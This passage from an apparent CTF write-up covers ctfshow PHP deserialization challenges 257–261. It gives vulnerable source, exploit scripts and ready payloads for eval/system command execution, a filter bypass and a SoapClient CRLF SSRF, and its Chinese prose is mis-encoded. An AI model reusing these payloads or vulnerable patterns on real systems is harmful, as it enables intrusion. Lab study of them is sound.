class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backDoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">?username=admin&amp;password=aaa</span><br><span class="line">COOKIEï¼š</span><br><span class="line">user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>tac+f%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ äº†ä¸ªè¿‡æ»¤ï¼š<code>/[oc]:\d+:/i</code><br>è¿‡æ»¤å‡ºï¼š<code>o/c:æ•°å­—</code><br>å¯ä»¥ä½¿ç”¨åŠ å·è¿‡æ»¤ï¼š<code>o:+</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>, <span class="string">&quot;O:+&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;user=&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%<span class="number">3</span>A%<span class="number">2</span>B11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>tac+f%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><blockquote><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a><br><a href="https://www.cnblogs.com/studyskill/p/6972576.html">https://www.cnblogs.com/studyskill/p/6972576.html</a><br><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p></blockquote><h3 id="SoapCLient-CRLF"><a href="#SoapCLient-CRLF" class="headerlink" title="SoapCLient+CRLF"></a>SoapCLient+CRLF</h3><p>è¿™æ€ä¹ˆä¸€ä¸‹å­å‡ç»´äº†ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpä¸­çš„è¿æ¥webéœ€è¦ä½¿ç”¨soapclientæ¥è¿æ¥ã€‚æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œç›´æ¥å€Ÿç”¨ä¸ªè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;yn8rt^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//è¿è¡Œç»“æœ</span></span><br><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>aaab%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A235%<span class="number">3</span>A%<span class="number">22</span>yn8rt%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A+<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AUM_distinctid%<span class="number">3</span>A175648cc09a7ae-<span class="number">050</span>bc162c95347-<span class="number">32667006</span>-<span class="number">13</span>c680-<span class="number">175648</span>cc09b69d%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A+<span class="number">13</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>ä¼ å‚ä¹‹åè®¿é—®flag.txtå³å¯<br>æ²¡çœ‹æ‡‚çš„å»ºè®®ç›´æ¥çœ‹ï¼š<br><a href="https://y4tacker.blog.csdn.net/article/details/110521104">https://y4tacker.blog.csdn.net/article/details/110521104</a></p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><p>æŸ¥è¯¢å‡ºé¢˜ç²¾ç¥çŠ¶æ€ï¼Œæ€ä¹ˆä¸€ä¸‹å­åˆè¿™ä¹ˆç®€å•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>ctf%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>c%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>ctfshow_i_love_36D%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><h3 id="unserialize-å’Œwakeup"><a href="#unserialize-å’Œwakeup" class="headerlink" title="__unserialize()å’Œwakeup()"></a>__unserialize()å’Œwakeup()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable 